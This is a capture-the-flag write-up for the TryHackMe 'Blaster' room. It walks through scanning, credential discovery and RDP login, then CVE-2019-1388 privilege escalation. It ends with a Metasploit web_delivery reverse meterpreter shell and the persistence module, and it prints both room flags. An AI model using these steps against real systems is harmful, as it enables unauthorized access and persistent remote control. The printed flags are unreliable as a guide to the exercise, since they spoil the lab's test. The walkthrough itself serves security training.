# [Blaster](https://tryhackme.com/room/blaster)

> A blast from the past!

## Scanning

scan the target, add `-Pn` option when doing with windows

```
nmap -sS -Pn -sV -sC -T4 10.10.194.71
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/f3c5a0c9-c2d9-4a6e-aac0-a1a5c49bfa52)

## HTTP

view the webpage

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/5ba39ee9-a321-42c6-b3bf-c2bcc9dcca54)

it's default IIS windows server

## Enumeration

enum the directories using gobuster

```
gobuster dir -u http://10.10.194.71 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 40
```

i found a hidden directory call /retro

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/de676823-17f9-48f0-8c49-1ccf488243d9)

view the webpage, we have a blog

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/3d82aa64-08ca-4b27-8689-4f5651787abe)

maybe the username is `wade`

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/9b552741-aaa4-438d-9878-bdd286630c85)

and i found a comment in that post may related to the password

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/18f94966-0c3d-4122-a707-174884bfc7bc)

## Exploitation

log into the machine using remmina

```
10.10.194.71
wade
parzival
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/783f1ed9-f6cc-445d-9886-0b8e189764d5)

inside, we have a user.txt

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/aebb9512-aeeb-43e1-afa1-50902d13f18c)

| Flag | user.txt |
| --- | --- |
| Answer | THM{HACK_PLAYER_ONE} |

## Privilege Escalation

let's diving into the machine, find some research about hhupd.exe

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/d62ce64c-0c32-4b80-adc5-f1ea11b29f7d)

it's CVE-2019-1388, run the program with administrator

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/601d5d80-f657-4032-bcbb-59d31d45faf4)

click on show more detail and click show author certificate

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/3d1558a0-1595-4fbf-9028-ef41173edeee)

click on the link and close the program, you will see a webpage in browser, now save the webpage

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/7272cba7-77d6-49d2-a280-80f2b8c96aab)

search for C:\Windows\System32\cmd.exe to open cmd

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/d6538b73-7fef-4192-a1fb-ea8b96be3582)

here you are, flag at Desktop of Admin account

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/fcc7222c-eb19-4bce-8713-efb2b8cb9988)

| Flag | root.txt |
| --- | --- |
| Answer | THM{COIN_OPERATED_EXPLOITATION} |

## Persistence access

now, we need to gain a remote shell access and persistence

```
msfconsole
use exploit/multi/script/web_delivery
options
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/15904890-fedd-4ec3-9d8e-8a3344cdaa8e)

set the options and target to PSH (powershell)

```
show targets
set target 2
set lhost 10.10.194.71
set lport 3389
set payload windows/meterpreter/reverse_http
run -j
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/baa995e1-5d68-46b8-a2d6-6dc59c6da684)

Run the command on the compromised machine and a reverse shell will spawn in a new Metasploit session

```
run persistence -X
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/6f460b71-6159-406f-b3b1-038eff699c2f)
